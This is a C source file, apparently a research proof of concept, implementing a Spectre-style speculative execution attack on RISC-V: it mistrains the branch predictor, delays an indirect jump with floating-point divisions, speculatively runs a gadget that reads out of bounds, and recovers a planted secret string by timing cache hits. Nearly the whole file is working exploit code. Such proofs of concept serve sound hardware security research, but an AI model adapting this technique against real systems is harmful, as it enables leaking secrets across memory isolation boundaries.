#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#endif
#ifndef ROUNDS
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2 // amount of times to attack the same index
#endif
#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 50
#endif

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "S3CreT";

static inline int isCandidateValue(uint64_t value){
    return (value >= '0' && value <= '9') ||
           (value >= 'A' && value <= 'Z') ||
           (value >= 'a' && value <= 'z');
}

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

/**
 * on the victim run this should be the function that should run. what should happen is that during the attack run
 * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
 */
void wantFunc(){
    asm("nop");
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
    uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
}

int main(void){
    uint64_t wantAddr = (uint64_t)(&wantFunc); 
    uint64_t victimAddr = (uint64_t)(&victimFunc);
    uint64_t start, diff, passInAddr;
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set (passInAddr, passInIdx)=(victimAddr, randIdx) or (wantAddr, attackIdx) after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 

                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // this calls the function using jalr and delays the addr passed in through fdiv
                asm("addi %[addr], %[addr], -2\n"
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "fcvt.s.lu fa4, t1\n"
                    "fcvt.s.lu fa5, t2\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fcvt.lu.s	t2, fa5, rtz\n"
                    "add %[addr], %[addr], t2\n"
                    "mv a0, %[arg]\n"
                    "jalr ra, %[addr], 0\n"
                    :
                    : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                    : "t1", "t2", "fa4", "fa5");
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                uint64_t candidate = ((i * 167) + 13) & 255;
                start = rdcycle();
                dummy &= array2[candidate * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                if ( isCandidateValue(candidate) && diff < CACHE_HIT_THRESHOLD ){
                    results[candidate] += 1;
                }
            }
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
